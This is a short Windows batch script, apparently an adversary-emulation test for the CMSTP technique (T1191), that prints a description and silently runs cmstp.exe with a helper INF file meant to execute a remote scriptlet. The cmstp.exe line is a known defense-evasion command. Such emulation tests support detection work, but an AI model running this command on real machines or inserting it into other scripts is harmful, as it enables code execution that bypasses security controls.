@ECHO OFF

ECHO ===========================================================================
ECHO CMSTP Executing Remote Scriptlet - T1191
ECHO Adversaries may supply CMSTP.exe with INF files infected with malicious commands

cmstp.exe /s helpers/T1191.inf
